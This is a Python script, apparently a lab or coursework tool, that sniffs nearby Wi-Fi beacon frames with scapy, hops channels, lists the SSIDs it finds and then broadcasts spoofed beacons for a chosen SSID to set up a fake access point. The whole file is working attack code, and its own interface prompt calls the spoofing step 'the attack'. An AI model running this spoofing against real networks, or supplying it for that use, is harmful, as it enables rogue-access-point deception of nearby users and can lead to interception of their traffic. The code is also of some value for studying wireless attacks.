# Source:
# - https://gist.github.com/securitytube/5291959
# - https://stackoverflow.com/questions/16748083/suppress-print-without-b-prefix-for-bytes-in-python-3
# - https://www.w3schools.com/python/python_dictionaries.asp
# - https://stackoverflow.com/questions/4256107/running-bash-commands-in-python
# - https://raspberrypi.stackexchange.com/questions/13099/packet-sniffing-with-channel-hopping-using-scapy
# - https://fr.wikibooks.org/wiki/Programmation_Python/Les_threads
# - https://stackoverflow.com/questions/2408560/python-nonblocking-console-input (Mickey Chan answer)
# - https://www.w3schools.com/python/python_arrays.asp
# - https://stackoverflow.com/questions/18018033/how-to-stop-a-looping-thread-in-python
# - https://gist.github.com/thepacketgeek/6876699
# - https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
# - https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around

import argparse
import subprocess
import threading
import time
import curses
import datetime
from scapy.all import *

apList = []
kill = False
line = 1
NUMBER_OF_CHANNEL = 14
BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"

# Arguments
parser = argparse.ArgumentParser(description="This script is used to detect nearby SSID and display them, and then when the user choose one of the SSID, it create a fake AP by spamming Beacon Frame advertising the same SSID")
parser.add_argument("-i", "--interface", required=True, help="the interface to use")
parser.add_argument("-n", "--number", default=0, type=int, help="the number of fake probe response to send")

arguments = parser.parse_args()

# This function is threaded, and is used to launch 'iwconfig' in order to change the channel of the card, each second.
def channelChange():
    i = 1

    while(True):
        if(kill):
            break
        
        time.sleep(1)
        cmd = "sudo iwconfig wlan0mon channel " + str(i)
        process = subprocess.Popen(cmd.split())

        i = i % 13 + 1

        #if(i == 0):
            #i = 1

# We use a nested function in order to pass argument to the sniff() callback function, source: https://gist.github.com/thepacketgeek/6876699
def packetHandling(line, stdscr):
    # This function verifiy if the packet is a management frame (more specifically a BeaconFrame), and read all necessary information from the packet (SSID, channel, etc...)
    def detectSSID(packet):
        global line
        # TODO: Limiter la pression des touches
        c = stdscr.getch()

        if(c != -1):
            fakeProbe(chr(c), stdscr)

        # We want to gather only BeaconFrame (type Management: 0 and sub type BeaconFrame: 8)
        if(packet.type == 0 and packet.subtype == 8):
            apName = packet.info.decode()
            # Source: https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
            # Some people were having strange SSID name so we get rid of all special char (\x00, etc...)
            apName = apName.rstrip("\x00")

            if(apName == ""):
                apName = "Hidden"

            found = False

            # Searching if the AP is already in the list
            for p in apList:
                if(p.info.decode() == packet.info.decode()):
                    found = True
                    break
            
            if(not found):
                apList.append(packet)
                # Source: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
                stdscr.addstr(line,0,str(len(apList)) + ") " + apName + " - CH " + str(ord(packet[Dot11Elt][2].info)) + "  " + str(packet.dBm_AntSignal) + " dBm")
                stdscr.refresh()
                line += 1
    return detectSSID

def fakeProbe(apNumber, stdscr):
    global line

    currentPacket = apList[int(apNumber) - 1]

    # Killing the changing channel thread
    global kill
    kill = True
    # Letting the thread finishing
    time.sleep(1)

    # Changing channel to the one of the real AP + 6
    newChannel = ((ord(currentPacket[Dot11Elt][2].info.decode()) + 5) % 13) + 1
    
    # Crafting and sending the probe response
    fakeBeacon= RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2="AA:AA:AA:AA:AA:AA", addr3="AA:AA:AA:AA:AA:AA") / Dot11Beacon() / Dot11Elt(ID= "SSID", info=currentPacket.info.decode()) / Dot11Elt(ID="DSset", info=chr(newChannel))
    
    stdscr.addstr(line+1,0,"Sending fake Beacon Frame for SSID " + currentPacket.info.decode())
    stdscr.refresh()

    if(arguments.number != 0):
        for i in range(0, arguments.number):
            sendp(fakeBeacon, iface=arguments.interface, verbose=False)
    # If the paramater '-n' is not set (or set to 0), we do an infinite while, until the user exit the script
    else:
        while 1:
            sendp(fakeBeacon, iface=arguments.interface, verbose=False)

def main(stdscr):
    global line

    channelThread = threading.Thread(target=channelChange)
    channelThread.start()
    stdscr.clear()
    curses.cbreak()

    curses.noecho()
    stdscr.nodelay(1)

    stdscr.addstr(line,0,"Type the number of the Wifi AP to begin the attack")
    stdscr.refresh()
    line += 2

    stdscr.addstr(line,0,"SSID          Channel         Power")
    stdscr.refresh()
    line += 1
    
    a = sniff(iface=arguments.interface, prn=packetHandling(line, stdscr))

curses.wrapper(main)